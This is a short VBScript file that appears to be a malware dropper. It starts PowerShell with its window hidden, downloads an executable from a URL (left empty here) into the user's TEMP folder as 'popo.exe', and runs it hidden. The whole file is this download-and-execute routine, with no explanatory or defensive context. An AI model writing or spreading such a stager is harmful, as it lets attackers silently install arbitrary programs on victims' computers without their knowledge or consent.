Set WshShell = CreateObject("WScript.Shell")
strCmd = "powershell.exe -NoProfile -WindowStyle Hidden -Command " & _
    """$url = '';" & _
    " $out = Join-Path $env:TEMP 'popo.exe';" & _
    " Invoke-WebRequest -Uri $url -OutFile $out;" & _
    " Start-Process -FilePath $out -WindowStyle Hidden"""
WshShell.Run strCmd, 0, False
